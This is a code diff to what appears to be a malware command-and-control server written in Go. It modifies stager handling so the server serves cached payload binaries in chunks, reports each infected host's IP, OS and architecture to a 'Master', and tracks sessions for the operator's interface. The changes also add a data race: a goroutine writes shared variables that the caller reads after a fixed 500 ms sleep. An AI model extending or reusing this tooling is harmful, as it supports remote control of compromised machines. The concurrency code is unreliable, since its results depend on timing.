@@ -102,13 +102,14 @@ type C2Manager struct {
 
 // CachedStagerSession tracks stager sessions created from cached data (no Master roundtrip)
 type CachedStagerSession struct {
-	SessionID      string
-	ClientBinaryID string
-	StagerIP       string
-	TotalChunks    int
-	ChunksServed   int
-	CreatedAt      time.Time
-	LastActivity   time.Time
+	SessionID       string
+	MasterSessionID string // Session ID assigned by Master for UI tracking
+	ClientBinaryID  string
+	StagerIP        string
+	TotalChunks     int
+	ChunksServed    int
+	CreatedAt       time.Time
+	LastActivity    time.Time
 }
 
 // NewC2Manager creates a new C2 management instance with the specified configuration.
@@ -1326,14 +1327,34 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 						logf("[C2] 🚀 Cache HIT for stager! Using cached binary: %s (%d chunks)", clientBinaryID, chunkCount)
 					}
 
-					// Report stager contact to Master (async, fire-and-forget)
-					// This just logs the contact, does NOT create a new session
+					// Report stager contact to Master and get Master-assigned session ID
+					// This allows Master to track the session in its UI
+					masterSessionID := ""
+					reportErr := error(nil)
 					go func() {
-						err := masterClient.ReportStagerContact(clientBinaryID, stagerIP, stagerOS, stagerArch)
+						var err error
+						masterSessionID, err = masterClient.ReportStagerContact(clientBinaryID, stagerIP, stagerOS, stagerArch)
 						if err != nil {
 							logf("[C2] Warning: Failed to report stager contact to Master: %v", err)
+						} else if masterSessionID != "" {
+							logf("[C2] Master assigned session ID: %s", masterSessionID)
+							// Update our local session with Master's ID
+							c2.mutex.Lock()
+							if session, ok := c2.cachedStagerSessions[sessionID]; ok {
+								session.MasterSessionID = masterSessionID
+							}
+							c2.mutex.Unlock()
 						}
+						reportErr = err
 					}()
+
+					// Wait briefly for Master to respond with session ID (max 500ms)
+					// This ensures progress reports use the correct session ID
+					time.Sleep(500 * time.Millisecond)
+					if reportErr == nil && masterSessionID != "" {
+						// Use Master's session ID for this stager
+						sessionID = masterSessionID
+					}
 
 					// Store session info locally for tracking
 					c2.mutex.Lock()
@@ -1341,15 +1362,14 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 						c2.cachedStagerSessions = make(map[string]*CachedStagerSession)
 					}
 					c2.cachedStagerSessions[sessionID] = &CachedStagerSession{
-						SessionID:      sessionID,
-						ClientBinaryID: clientBinaryID,
-						StagerIP:       stagerIP,
-						TotalChunks:    chunkCount,
-						CreatedAt:      time.Now(),
+						SessionID:       sessionID,
+						MasterSessionID: masterSessionID,
+						ClientBinaryID:  clientBinaryID,
+						StagerIP:        stagerIP,
+						TotalChunks:     chunkCount,
+						CreatedAt:       time.Now(),
 					}
-					c2.mutex.Unlock()
-
-					// Return META immediately (no Master roundtrip!)
+					c2.mutex.Unlock() // Return META immediately (no Master roundtrip!)
 					metaResponse := fmt.Sprintf("META|%s|%d", sessionID, chunkCount)
 					if !isDuplicate {
 						logf("[C2] Returning META response from cache: %s (len=%d)", metaResponse, len(metaResponse))
